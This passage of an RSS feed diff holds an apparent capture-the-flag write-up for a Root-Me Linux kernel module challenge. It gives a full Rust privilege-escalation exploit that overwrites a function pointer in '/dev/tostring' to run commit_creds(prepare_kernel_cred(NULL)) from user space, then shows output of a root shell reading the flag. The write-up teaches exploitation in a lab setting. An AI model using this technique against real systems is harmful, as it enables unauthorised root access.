+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.248291&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; ---&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; end trace 90f382dd3902791d &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;---
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.256918&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Kernel panic - not syncing: Fatal exception
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.268806&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Kernel Offset: disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;  300.275348&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Rebooting in &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; seconds..
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;crafting-the-exploit&#34;&gt;Crafting the exploit&lt;/h3&gt;
+&lt;p&gt;Previously, we saw a bug in the target LKM that would allow an attacker to overwrite a function pointer used by the module, and then trigger a call to this function pointer.&lt;/p&gt;
+&lt;p&gt;From this we can infer that the target kernel function will be called with the arguments for &lt;code&gt;tostring_read&lt;/code&gt;. It can be problematic for calling specific functions, but in our case, some security protections (&lt;strong&gt;SMAP&lt;/strong&gt; &amp;amp; &lt;strong&gt;SMEP&lt;/strong&gt;) are not enabled, meaning we can try to exploit another way (which is simplier).&lt;/p&gt;
+&lt;h4 id=&#34;executing-code&#34;&gt;Executing code&lt;/h4&gt;
+&lt;p&gt;Instead of trying to divert control flow to &lt;strong&gt;kernel functions&lt;/strong&gt;, or &lt;strong&gt;ROP&lt;/strong&gt; into kernel memory, we could just write a userspace function that performs the privilege escalation logic and uses addresses of kernel functions. As SMEP isn&amp;rsquo;t enabled, kernel will &lt;strong&gt;jump to userspace and execute code&lt;/strong&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;escalating-privilege-from-kernel&#34;&gt;Escalating privilege from kernel&lt;/h4&gt;
+&lt;p&gt;When a userspace program wants to escalate its privilege to root by exploiting the kernel, it can achieve it by changing it&amp;rsquo;s credentials to root (uid=0 and gid=0).&lt;/p&gt;
+&lt;p&gt;Changing a process credentials inside the kernel is typically done by calling &lt;code&gt;commit_creds&lt;/code&gt; function with a &lt;code&gt;struct cred&lt;/code&gt; parameter initialized to zero (representing credentials of user root).&lt;/p&gt;
+&lt;p&gt;Getting a pointer to a root credentials structure is as simple as calling &lt;code&gt;prepare_kernel_cred(NULL)&lt;/code&gt;. This works only on linux kernel versions older than &lt;code&gt;6.2.0&lt;/code&gt;, because the kernel was defaulting the credentials to the init process credentials (pid 1, likely root) in case no argument was provided to the &lt;code&gt;prepare_kernel_cred&lt;/code&gt; function.
+You can see the &lt;a href=&#34;https://github.com/torvalds/linux/commit/5a17f040fa332e71a45ca9ff02d6979d9176a423&#34;&gt;commit&lt;/a&gt; removing this behavior from the linux kernel (new exploits now need to directly write the &lt;code&gt;task_struct&lt;/code&gt; of current process to modify credentials)&lt;/p&gt;
+&lt;p&gt;For simplicity, we will stick to the older kernels exploit style: &lt;code&gt;commit_creds(prepare_kernel_cred(NULL))&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;getting-kernel-functions-adresses&#34;&gt;Getting kernel functions adresses&lt;/h4&gt;
+&lt;p&gt;The kernel directly exposes the kernel functions adresses in the &lt;code&gt;/proc/kallsyms&lt;/code&gt; file (even for non root user), meaning we do not need to leak a pointer from kernel space.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat /proc/kallsyms | grep prepare_kernel_cred
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 0000000000000000 T prepare_kernel_cred&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat /proc/kallsyms | grep commit_creds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 0000000000000000 T commit_creds&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;getting-root&#34;&gt;Getting root&lt;/h3&gt;
+&lt;p&gt;Piecing all of this together, we modify the previous script to exploit the vulnerability and get a root shell :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;use&lt;/span&gt; std::{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    arch::asm,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fs::OpenOptions,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io::{Read, Write},
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TOSTRING_STACK_SIZE&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;PREPARE_KERNEL_CRED_EA&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc10711f0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;COMMIT_CREDS_EA&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xc1070e80&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;extern&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;escalate_privileges&lt;/span&gt;() -&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;isize&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsafe&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        asm!(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xor eax, eax&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;call ebx&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// syscall abi (takes args from eax, ecx, edx)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;call edi&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// same
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ebx&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;PREPARE_KERNEL_CRED_EA&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;edi&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;COMMIT_CREDS_EA&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] @prepare_kernel_cred = 0x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{:x}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;PREPARE_KERNEL_CRED_EA&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] @commit_creds = 0x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{:x}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;COMMIT_CREDS_EA&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[?] Check out function addresses in /proc/kallsyms&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; intval: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; tostring_read_override_ea: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; escalate_privileges &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; dev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;match&lt;/span&gt; OpenOptions::new()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .read(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .write(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dev/tostring&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Ok(f) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; f,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Err(e) &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            eprintln!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed to open /dev/tostring: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, e);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            std::process::exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Filling stack&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;TOSTRING_STACK_SIZE&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        dev.write_all(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;intval.to_le_bytes())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            .expect(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed to write to /dev/tostring to override stack&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Overriding function pointer&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dev.write_all(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;tostring_read_override_ea.to_le_bytes())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        .expect(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Failed to write to /dev/tostring to override function pointer&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;; size_of::&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;()];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    println!(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Triggering vuln. Should call our injected function pointer (ea=0x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{:x}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        escalate_privileges &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dev.read_exact(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; ret);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;unsafe&lt;/span&gt; { libc::getuid() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; libc::getgid() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; } {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        println!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Got root ! Spawning shell...&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;mut&lt;/span&gt; child &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; std::process::Command::new(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;).spawn().unwrap();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        child.wait().unwrap();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        eprintln!(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Failed to get root&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Upload the binary to the shared folder of the QEMU VM, and run it. We got a root shell !&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Root-Me user@linkern-chall:~$ ./exploit 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[-] @prepare_kernel_cred = 0xc10711f0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[-] @commit_creds = 0xc1070e80
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[?] Check out function addresses in /proc/kallsyms
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] Filling stack
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] Overriding function pointer
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] Triggering vuln. Should call our injected function pointer (ea=0x804b250)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Got root ! Spawning shell...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Root-Me root@linkern-chall:/home/user$ cat /passwd/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__FLAG__
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
